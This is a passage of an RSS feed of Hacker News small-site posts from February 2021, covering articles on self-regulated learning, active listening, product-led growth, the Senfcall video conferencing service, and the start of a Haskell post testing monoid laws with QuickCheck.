<p>The point of becoming sophisticated as a learner requires knowing how to manage your own learning activities.</p>



<p>It requires planning and the process is guided by metacognition (thinking about thinking). Or in our case, thinking about how to learn better.</p>



<figure><img width="1024" height="512" src="https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1024x512.jpg" alt="thinking about how to learn better" srcset="https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-150x75.jpg 150w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20512'%3E%3C/svg%3E" data-lazy-srcset="https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-150x75.jpg 150w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better.jpg 2000w" data-lazy-src="https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1024x512.jpg"><figcaption>Learning new things is very useful, of course, but the danger is that the act of soaking up new facts without first setting up a process can become a time-wasting activity.</figcaption></figure>







<p>This is a deliberate thought process that one must consider before actually approaching anything new. In simple words, this means that you don’t just open Google and start endlessly browsing articles. You first ask yourself: “What do I want to learn?; Why do I want to learn this?” You set expectations and goals. You consider your weaknesses in the learning process and find resources that are most likely to appeal to your persona.</p>



<p>Instead of relying on the algorithms to show you great content, you approach things strategically – you search for great content based on your goal.</p>



<p>Here are the fundamentals to create your own learning process:</p>



<ul><li><strong>Establish a plan and find resources</strong>: The first requirement, sort to say, is asking yourself what do you want to learn and why. Then, figure out what sources you’ll use, and how you’ll find them, to learn the desired thing. And finally, set a learning schedule and form a plan that will help you along the way.</li><li><strong>Monitoring and maintenance of knowledge</strong>: This is often overlooked. You can’t expect to remember everything from your first attempt. You should monitor yourself and find gaps in your skills – your processes. Then, find new ways to approach things that are hard for you to understand. Additionally, since often learning something new requires retention of certain facts, writing down the most important things is also a must.</li><li><strong>Self-reflection and adapting</strong>: Getting a good grade in school feels awesome. Launching a product and making sales is amazing. But these things are just outcomes. Often, the results we get are a lot of times based on luck, not always dependent on what we did. That’s why it’s far more important to reflect on what you think you did that get you these results and why.</li></ul>



<p>Now, once we have the fundamentals, let’s expand this further…</p>







<h2>How to Best Approach Something New?</h2>



<p>To put all of the above into practice, let’s consider another following example:</p>



<p>You just graduated from school. And while you are relieved, you just realized that …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://durmonski.com/self-improvement/what-is-self-regulated-learning/">https://durmonski.com/self-improvement/what-is-self-regulated-learning/</a></em></p>]]>
            </description>
            <link>https://durmonski.com/self-improvement/what-is-self-regulated-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114006</guid>
            <pubDate>Fri, 12 Feb 2021 14:33:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use Active Listening to Boost Your Career]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26113297">thread link</a>) | @ochronus
<br/>
February 12, 2021 | https://ochronus.online/active-listening-boosts-careers/ | <a href="https://web.archive.org/web/*/https://ochronus.online/active-listening-boosts-careers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-url="https://ochronus.online/active-listening-boosts-careers/" data-title="Use Active Listening to Boost Your Career">
<h2 id="0-what-is-active-listening-" data-kb-block="kb-adv-heading_2b06d7-a8"><strong>What is active listening?</strong></h2>
<p>Active listening is the ability to focus completely on a speaker, understand their message, comprehend the information and respond thoughtfully, in a relevant way. Compared to passive listening, this highly valued interpersonal communication skill ensures you’re able to engage with your peer and later recall specific details without needing information repeated. Your partner will feel cared for and listened to, which results in building genuine and honest relationships.</p>
<p>To practice active listening, you make a conscious effort to hear not only the words that another person is saying but, more importantly, the&nbsp;complete message&nbsp;being communicated, subtle hints and non-verbal messages included, such as tone, emphasis, facial expressions and body language.</p>
<p>Active listening is always neutral and nonjudgmental from the listener’s side.</p>
<p>Finally, to practice active listening, you turn an otherwise passive process into an interactive flow by techniques such as eye contact, asking follow-up questions and reflecting back what was said.<br></p>
<h2 id="1-why-is-active-listening-essential-in-a-work-environment-" data-kb-block="kb-adv-heading_14e87a-de"><strong>Why is active listening essential in a work environment?&nbsp;</strong></h2>
<p>First and foremost, <strong>it helps you build trust</strong>. When people know they can speak freely to you without interruptions and judgment, they’ll be more likely to confide in you. This is especially helpful when meeting a new customer or business contact with whom you want to develop a long-term working relationship.</p>
<p><strong>It helps you build genuine and honest connections. </strong>Active listening helps others feel comfortable sharing information with you. When you demonstrate your willingness and ability to listen to what others have to say truly, people will be motivated to communicate with you on a regular basis. This can open up opportunities to collaborate with others, get work done quickly or start new projects. All of these things can help lead you to success in your career. As a manager, this skill is also essential to your success – in fact, the lack of it is <a href="https://ochronus.online/engineering-manager-4-ways-of-failure/#3-4-too-much-solving-not-enough-listening">one of the key ways to fail</a>.</p>
<p><strong>It helps you increase your knowledge and understanding of various topics. </strong>The best employees are always striving to learn something new and grow their knowledge base. Because active listening helps you retain information, it will also help you better understand new topics and remember what you’ve learned so you can apply it in the future.</p>
<p><strong>It helps you identify and solve problems. </strong>Actively listening to others will help you detect challenges and difficulties others face or problems within projects. The more quickly you’re able to spot these issues, you sooner you can find a solution or create a plan to address it.</p>
<h2 id="2-how-can-active-listening-be-beneficial-while-searching-for-a-job-" data-kb-block="kb-adv-heading_6339e7-8f"><p><strong>How can active listening be beneficial while searching for a job?</strong></p></h2>
<p>Active listening is beneficial throughout the whole process of searching for a job.&nbsp;</p>
<p>When you look at job advertisements and research companies, you can look for clues that might help you learn more about the company before you apply. Don’t just look at the words, though. Try to identify the tone of the post. Does the job posting use formal language? Casual? Conversational? Does it use a lot of technical jargon or industry language? Does it seem frantic? All of these can help determine what the job and company are like and help you decide if you want to apply. Actively listen to the company website’s tone to learn more about the company culture. What images do they use? Are they stock photos, formal portraits, or candid images? Are there videos you can watch (and listen to!)? How formal or informal is the narrator? What do you find on social media? All of these clues can help you figure out if the company is the right fit for you.</p>
<figure><img width="1024" height="683" src="https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-1024x683.jpg" alt="tim mossholder GOMhuCj O9w unsplash" srcset="https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-1024x683.jpg 1024w, https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-300x200.jpg 300w, https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-768x512.jpg 768w" sizes="(max-width: 1024px) 100vw, 1024px" title="Use Active Listening to Boost Your Career 3" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20683'%3E%3C/svg%3E" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-1024x683.jpg 1024w, https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-300x200.jpg 300w, https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-768x512.jpg 768w" data-lazy-src="https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-1024x683.jpg"><figcaption>Photo by <a href="https://unsplash.com/@timmossholder?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank" rel="noopener">Tim Mossholder</a> on <a href="https://unsplash.com/s/photos/hiring?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank" rel="noopener">Unsplash</a></figcaption></figure>
<p>Naturally, the best place to utilize your active listening skills is the interview. You gather much more information this way, both because of encouraging your interviewer to be more honest with you and asking clarifying and follow-up questions. Active listening can also boost your evaluation during and after an interview. More and more companies recognize that good communication skills are essential for job success and even company culture and are actively looking for it during interviews. Even if you interview at a company which does not focus on this, you will leave a good impression by being an active listener – you’ll seem more interested in the job than other candidates. It will be in general much more enjoyable for the interviewer to talk to you. Last but not least, actively listening to your interviewer, you’ll get a glimpse of what kind of communication standards are present in your target company and whether you’d enjoy working there.</p>

<h2 id="3-how-can-you-best-practice-active-listening-" data-kb-block="kb-adv-heading_3396a3-a4"><p><strong>How can you best practice active listening?</strong></p></h2>
<p>Active listening starts with the <strong>right intent</strong>. If you don’t actually care about what the other person wants to say it will be tough to listen genuinely. We are frequently rushing from meeting to meeting, and our minds are already on the next thing we need to do when talking to someone. Slowing down and taking some time (even a minute can help!) to refocus our attention and prepare right before the discussion starts is essential. If you know the topic in advance, think a bit about it while considering your peer’s context with regards to it. What is their potential goal with the conversation, what do they hope to get out of it? What mindset would that result in, and how could that influence the discussion? How can you best support them?</p>
<p><strong>Be curious</strong> about what the other person has to say. Actively work on putting your judgment aside and be neutral, even when what they say strikes a nerve. Giving feedback is generally not a part of active listening, it comes after that and only if the other person asked for it.</p>
<p>Giving <strong>verbal and non-verbal affirmations and cues</strong> is key so that your peer actually feels that you are listening to them.</p>
<p><strong>Don’t interrupt</strong> your partner while they are speaking. Use non-verbal cues to demonstrate that you’re following along.</p>
<p><strong>Shut down your internal dialogue</strong> – this both helps you focus and keeps you judgment-free.</p>
<p><strong>Be patien</strong>t with the other person – you might feel the discussion is dragging on but remember your role is to listen, not to enforce your agenda! On a related note, don’t abruptly change the subject until you’ve made sure your peer said what they wanted to about the topic at hand.</p>
<h3 id="4-what-are-some-verbal-ways-to-demonstrate-active-listening-" data-kb-block="kb-adv-heading_b430a5-b3">&nbsp;<p><strong>What are some verbal ways to demonstrate active listening?</strong></p></h3>
<p>A <a href="https://www.tandfonline.com/doi/abs/10.1080/08934215.2011.610731" target="_blank" rel="noopener">2011 study</a> concluded that active listening was primarily associated with verbal social skills.</p>
<p>One of the most important techniques to verbally demonstrating active listening is paraphrasing. This is a form of reflecting on what you’ve heard by summarizing the message’s main points in your own words. When you do this, you show that you understand the message and you’re also giving a chance to your peer to clarify or expand it further. An example: “So you’re basically saying that our training process works in general, but could use some improvement, right?</p>
<p>Asking <strong>open-ended follow-up questions</strong> is equally important. Ask these questions in a way that demonstrates that you’ve gathered the essence of what your partner was saying and also guide them to share more or more in-depth information. This technique can be used together with paraphrasing. Open-ended questions are ones that cannot be answered with a simple “yes” or “no” but instead require your peer to elaborate. An example, building on the previous paragraph: “I understand you feel our training process could be improved – what changes would you like to see?”</p>
<p>Besides open-ended questions, you can ask more specific probing questions too. These questions drill deeper into topics or can be used to narrow down the scope of a subject that might be too broad to discuss in one setting. Example: “Could you elaborate a bit on how the sequencing of training sessions was unhelpful?”&nbsp;</p>
<p>Learn more about questions as a coaching technique here: <a href="https://ochronus.online/questions-vs-directions/">Coaching Questions vs. Giving Directions – Ochronus online</a></p>
<p><strong>Displaying empathy</strong> goes a long way in conversations and is key in active listening. Ensure your peer understands that you recognize their emotions and maybe even share their feelings. Go a step further with showing compassion which will help you connect with your partner and establish mutual trust. Example: “Going through that kind of an experience must have been hard for you; I’m really sorry!”</p>
<p>You can <strong>share similar experiences</strong> to show you deeply understand what your peer is talking about. It will also help build the relationship and – depending on the goal of the situation – can turn into you giving valuable advice about how you’ve solved similar challenges in the past. Example: “I also had a tough time with the training process years ago. This is how I made it better: ….”</p>
<p><strong>Short verbal affirmations and cues</strong> are probably the easiest way to show that you’re following along and are still engaged. Some of these can even be used while the speaker is talking without interrupting them. Examples: “Mhm”, “I see”, “I agree”.</p>
<p>Nothing demonstrates that you care about your peer and the topic at hand than <strong>recalling relevant, previously shared information</strong>. Example: “Oh, true, and I remember you shared your ideas about improving our training process – let’s make sure we implement those ideas!”</p>
<h3 id="5-what-are-some-non-verbal-ways-to-demonstrate-active-listening-" data-kb-block="kb-adv-heading_343c56-85"><p><strong>What are some non-verbal ways to demonstrate active listening?&nbsp;</strong></p></h3>
<p>Non-verbal cues are just as important as verbal ones in active listening, and there is a set of simple things you can do here. Use a combination of the following techniques:</p>
<p>Maintaining <strong>eye contact</strong> is a sure way to make the speaker feel you’re focused on them. Make sure your gaze is natural and conveys a feeling of interest and care.</p>
<div>
<div>
<figure><picture title="Use Active Listening to Boost Your Career 4">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-scaled.jpg.webp 2560w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-300x225.jpg.webp 300w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-1024x769.jpg.webp 1024w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-768x576.jpg.webp 768w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-1536x1153.jpg.webp 1536w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-2048x1537.jpg.webp 2048w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%202560%201921'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 2560px) 100vw, 2560px">
<img width="2560" height="1921" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%202560%201921'%3E%3C/svg%3E" alt="smile" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-scaled.jpg 2560w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-300x225.jpg 300w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-1024x769.jpg 1024w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-768x576.jpg 768w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-1536x1153.jpg 1536w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-2048x1537.jpg 2048w" data-lazy-sizes="(max-width: 2560px) 100vw, 2560px" data-lazy-src="https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-scaled.jpg">
</picture>
</figure>
</div>
<p><strong>Smiling</strong> is one of our best tool to display positive emotions. Use it generously during your active listening sessions. A smile can take the place of a short verbal affirmation in helping to diffuse any tension and ensure the speaker feels comfortable.</p>
</div>
<p><strong>Nodding </strong>is a helpful and supportive cue and can not only signal that you’re following …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ochronus.online/active-listening-boosts-careers/">https://ochronus.online/active-listening-boosts-careers/</a></em></p>]]>
            </description>
            <link>https://ochronus.online/active-listening-boosts-careers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26113297</guid>
            <pubDate>Fri, 12 Feb 2021 13:18:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I changed my mind about product-led growth]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26112997">thread link</a>) | @gk1
<br/>
February 12, 2021 | https://www.gkogan.co/blog/product-led-growth/ | <a href="https://web.archive.org/web/*/https://www.gkogan.co/blog/product-led-growth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Whether it was our first call or our hundredth, founders inevitably asked me whether they should market and sell their enterprise software to buyers/executives (top-down) or to users (bottom-up). My view, which only strengthened every time I uttered it, was this:</p>

<p>Marketing and selling to users is just another, roundabout way of getting to the buyer. Compared with the top-down approach — think whitepapers and meetings with the CIO — it takes more effort and time to see a payoff. More effort because users want a smooth self-serve experience, which means more product work. More time because big budget decisions are made at the executive level, which means you are just adding more hoops to hop through before meeting the CIO.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/e1d7c01d1b02afb36c6da331334936f4823d9ce9/0dfc5/images/uploads/343.jpg" alt="Cartoon about dogs in the board room."></p>

<p>More recently this inevitable question evolved from “top-down or bottom-up?” to “what do you think of product-led growth?”</p>

<p><a href="https://www.gkogan.co/product-led-growth/">Product-led growth</a> is the strategy of getting to the users first. It emphasizes letting users see, test, and get value from the product quickly and on their own. Since it’s an evolution of “bottom-up,” my answer was more or less the same.</p>

<p>Sure, there were success stories like Atlassian and GitLab, but those were exceptions to the rule, especially for enterprise software.</p>

<p><strong>I was wrong.</strong></p>

<p>Although the clues had been all around me for months, I paid them no mind until they hit me in the face in quick succession:</p>

<ul>
  <li>
    <p>Late in November I had an intro call with yet another founder interested in product-led growth.</p>
  </li>
  <li>
    <p>A week later, another founder brought up product-led growth. Not as a question but as a decision they’ve made. (I now <a href="https://www.gkogan.co/blog/pinecone/">work</a> for this <a href="https://www.pinecone.io/">company</a> in part because of that decision.)</p>
  </li>
  <li>
    <p>The next day, I attended several sessions at FC Build, where CEOs of unicorn and public companies mentioned product-led growth either as a major contributor to their growth or a major area of focus in the future.</p>
  </li>
  <li>
    <p>The day after, I spoke on a panel about developer marketing, with other panelists from Twilio, Google Cloud, and Sequoia. In this discussion I heard “developer marketing” used interchangeably with “product-led growth.” (Much of my work involves marketing to developers, yet I never thought of it as product-led growth.) The event organizer holds a panel like this every month, and this one had the most attendants of all.</p>
  </li>
  <li>
    <p>A week later, Tomasz Tunguz of Redpoint Ventures made a <a href="https://tomtunguz.com/2021-predictions/">prediction</a> that “Product-led growth [will become] the standard GTM for software and infrastructure companies” in 2021.</p>
  </li>
</ul>

<hr>

<p><em>By the way, I write an article like this every month or so, covering lessons learned from growing B2B software startups. Get an email update when the next one is published:</em>
<!-- Begin MailChimp Signup Form --></p>



<!--End mc_embed_signup-->
<hr>

<p>Over a few reflective days in December, other clues from the past year started coming into focus:</p>

<ul>
  <li>
    <p>My three biggest opportunities of the year — two unicorns and one Fortune-50 company — revolved around product-led growth. (Having failed to recognize it at the time, I lost those opportunities.)</p>
  </li>
  <li>
    <p>Some of the projects I enjoyed most were really about product-led growth: Launching a trial and growing data scientist users for <a href="https://www.dominodatalab.com/">Domino Data Lab</a>, increasing self-serve revenue from developers for <a href="https://www.netlify.com/">Netlify</a>, and commercializing open-source software for <a href="https://www.goteleport.com/">Teleport</a>.</p>
  </li>
  <li>
    <p>Seemingly every one of my startup clients and every other prospective client had asked me about product-led growth at some point, indicating widespread interest among founders and their investors.</p>
  </li>
  <li>
    <p>As I researched enterprise software companies that recently went public for my <a href="https://www.gkogan.co/blog/category-creation/">category creation</a> post, I noticed more than half of them offer free trials.</p>
  </li>
</ul>

<p>To ensure I wasn’t just seeing what I wanted to see, I emailed five investors with a question: “How much (or little) demand are you seeing for product-led growth compared to enterprise demand-gen?” Four out of five confirmed seeing strong demand and opportunity for product-led growth among startups; one remained neutral.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/399f678b2d026ec46d1dbd67095ad42bd7552e52/80e97/images/uploads/370.jpg" alt="Cartoon about getting a second opinion."></p>

<p>The trend was clear: Software purchasing decisions are increasingly starting with the users. “What tools do my engineers need,” “what do they already use,” “can they try this,” “what do they think of this?” Ironically, calling the CIO is now a roundabout way of getting to the users.</p>

<p>I changed my mind about product-led growth. Software companies not already targeting users (over buyers) should consider changing theirs.</p>


    <p>◼</p>

    <p>PS - Liked this article? I write one every month or so, covering lessons learned on B2B startup growth. Don't miss the next one:</p>

    <!-- Begin MailChimp Signup Form -->
    

    <!--End mc_embed_signup-->
    
    <p>If you need help with marketing and revenue growth, <a href="https://www.gkogan.co/contact/">get in touch</a>.</p>

  </div>

  

  
  
  



</article>

<!-- Begin MailChimp popup signup form -->



<!-- End MailChimp popup signup form -->
      </div>
    </div></div>]]>
            </description>
            <link>https://www.gkogan.co/blog/product-led-growth/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112997</guid>
            <pubDate>Fri, 12 Feb 2021 12:40:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Senfcall.de – Privacy respecting video conferencing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26112448">thread link</a>) | @dschuessler
<br/>
February 12, 2021 | https://www.senfcall.de/en/ | <a href="https://web.archive.org/web/*/https://www.senfcall.de/en/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<div>
			
<div>
    <div>
        
			
        
			
        
			
        
			
        
			
        <div>
            <p><img src="https://www.senfcall.de/shield.svg" alt="Icon Data-minimising"></p><div>
                <h3>Data-minimising</h3>
                <p>We only collect the data that is necessary for the service. All data is processed on a <strong>server in Germany</strong>.</p>

            </div>
        </div>
        
        
			
        <div>
            <p><img src="https://www.senfcall.de/compass.svg" alt="Icon Without installation"></p><div>
                <h3>Without installation</h3>
                <p>You can use Senfcall <strong>easily via web browser</strong> on all your devices, without any installation! No additional software that creates new security holes.</p>

            </div>
        </div>
        
        
			
        <div>
            <p><img src="https://www.senfcall.de/check-square.svg" alt="Icon GDPR compliant"></p><div>
                <h3>GDPR compliant</h3>
                <p>Senfcall breathes the spirit of the GDPR. We don't wrap ourselves around the rules, but treat <strong>data protection as a first-class citizen</strong>.</p>

            </div>
        </div>
        
        
			
        <div>
            <p><img src="https://www.senfcall.de/code.svg" alt="Icon Open-Source"></p><div>
                <h3>Open-Source</h3>
                <p>For Senfcall we use the <strong>Open Source</strong> Web Conference Tool <a href="https://github.com/bigbluebutton/bigbluebutton">BigBlueButton™</a>. Moreover, we publish some of <a href="https://www.senfcall.de/opensource">our own tools</a> under free licences.</p>

            </div>
        </div>
        
        
    </div>
</div>


<div>
    
<p>Many claim: "Reliable video conferencing? Only big companies in Silicon Valley can do that". But these companies are repeatedly criticised for endangering our privacy and the security of our computers.</p>
<p>As students in Darmstadt and Karlsruhe, we were forced by our universities to use the applications of such companies. That's why we want to show that video communication for digital family visits, web seminars, teaching and conferences also works with data protection. With Senfcall we offer videoconferencing via the open source software <a href="https://bigbluebutton.org/">BigBlueButton™</a>. The advantage: to use Senfcall you only need your web browser - no additional software that creates new security holes.</p>
<p>So that you can also use privacy protecting video conferences.</p>
<p>Senfcall uses BigBlueButton and is not endorsed or certified by BigBlueButton Inc. BigBlueButton and the BigBlueButton Logo are trademarks of BigBlueButton Inc..</p>

</div>




		</div>
	</section></div>]]>
            </description>
            <link>https://www.senfcall.de/en/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112448</guid>
            <pubDate>Fri, 12 Feb 2021 11:17:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fuzz me wrong – How QuickCheck destroyed my favourite theory]]>
            </title>
            <description>
<![CDATA[
Score 123 | Comments 53 (<a href="https://news.ycombinator.com/item?id=26112441">thread link</a>) | @lrngjcb
<br/>
February 12, 2021 | https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html | <a href="https://web.archive.org/web/*/https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    
    <div>
    <p><em>Posted on January 30, 2021
    
        by Thomas Mahler
    </em></p></div>

<h2 id="introduction">Introduction</h2>
<p>Quite a while back I wrote a larger article on the algebraic foundation of software patterns which also covered the <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html#map-reduce">MapReduce algorithm</a>.</p>
<p>During the research digged out a paper on <a href="https://pdfs.semanticscholar.org/0498/3a1c0d6343e21129aaffca2a1b3eec419523.pdf">algebraic properties of distributed big data analytics</a>, which explained that a MapReduce will always work correctly when the intermediate data structure resulting from the <code>map</code>-phase is a Monoid under the <code>reduce</code>-operation.</p>
<p>For some reason, I was not convinced that this Monoid-condition was enough, because all the typical examples like word-frequency maps are even <strong>commutative</strong> Monoids under the respective reduce operation.</p>
<p>So I came up with the following personal theory:</p>
<blockquote>
<p>Only if the intermediate data structure resulting from the <code>map</code>-phase is a <strong>commutative Monoid</strong> under the <code>reduce</code>-operation, then a parallel MapReduce will produce correct results.</p>
</blockquote>
<p>I tried to validate this property using the <a href="https://wiki.haskell.org/Introduction_to_QuickCheck2">QuickCheck test framework</a>.</p>
<p>Interestingly the QuickCheck tests failed! This finally convinced me that my theory was wrong, and after a little deeper thought, I could understand why.</p>
<p>I was impressed with the power of QuickCheck, so I thought it would be a good idea to share this lesson in falsification.</p>
<p>The code shown in this blog <a href="https://github.com/thma/CommutativeMonoid">is also available on GitHub</a></p>
<h2 id="commutative-monoids">Commutative Monoids</h2>
<p>In abstract algebra, a monoid is a <em>set</em> equipped with an <em>associative binary operation</em> and an <em>identity element</em>.</p>
<p>The simplest example for a <em>commutative Monoid</em> is <span>\((\mathbb{N}_0, +, 0)\)</span>: the natural numbers under addition with <span>\(0\)</span> as the identity (or neutral) element. We can use QuickCheck to verify that indeed the Monoid laws plus commutativity are maintained.</p>
<p>If we want to use <code>GHC.Natural</code> type to represent natural numbers, we first have to make <code>Natural</code> instantiate the <code>Arbitrary</code> type class which is used by QuickCheck to automatically generate test data:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>import</span>           <span>Test.QuickCheck</span> (<span>Arbitrary</span>, arbitrary, <span>NonNegative</span> (..))</span>
<span id="cb1-2"><span>import</span>           <span>GHC.Natural</span>     (<span>Natural</span>, naturalFromInteger)</span>
<span id="cb1-3"></span>
<span id="cb1-4"><span>instance</span> <span>Arbitrary</span> <span>Natural</span> <span>where</span></span>
<span id="cb1-5">  arbitrary <span>=</span> <span>do</span></span>
<span id="cb1-6">    <span>NonNegative</span> nonNegative <span>&lt;-</span> arbitrary</span>
<span id="cb1-7">    <span>return</span> <span>$</span> naturalFromInteger nonNegative</span></code></pre></div>
<p>Now we can start to write our property based tests. For algebraic structures it is straightforward to come up with properties: we just write the required laws (associativity, 0 is identity element and commutativity) as properties.</p>
<p>I am using Hspec as a wrapper around QuickCheck as it provides a very nice testing DSL which makes it easy to read the code and the output of the test suite:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>import</span>           <span>Test.Hspec</span></span>
<span id="cb2-2"></span>
<span id="cb2-3"><span>spec ::</span> <span>Spec</span></span>
<span id="cb2-4">spec <span>=</span> <span>do</span></span>
<span id="cb2-5">  describe <span>"The Monoid 'Natural Numbers under Addition'"</span> <span>$</span> <span>do</span></span>
<span id="cb2-6">    it <span>"is associative"</span> <span>$</span></span>
<span id="cb2-7">      property <span>$</span> \x y z <span>-&gt;</span> ((x <span>+</span> y) <span>+</span> z) <span>`shouldBe`</span> ((x <span>+</span> (y <span>+</span> z))<span> ::</span> <span>Natural</span>)</span>
<span id="cb2-8">      </span>
<span id="cb2-9">    it <span>"has 0 as left and right identity element"</span> <span>$</span></span>
<span id="cb2-10">      property <span>$</span> \x <span>-&gt;</span> (x <span>+</span> <span>0</span> <span>`shouldBe`</span> (<span>x ::</span> <span>Natural</span>)) <span>.&amp;&amp;.</span> (<span>0</span> <span>+</span> x <span>`shouldBe`</span> x)</span>
<span id="cb2-11">      </span>
<span id="cb2-12">    it <span>"is commutative"</span> <span>$</span></span>
<span id="cb2-13">      property <span>$</span> \x y <span>-&gt;</span> x <span>+</span> y <span>`shouldBe`</span> (y <span>+</span><span> x ::</span> <span>Natural</span>)</span></code></pre></div>
<p>The output of these tests will be as follows:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>Monoid</span></span>
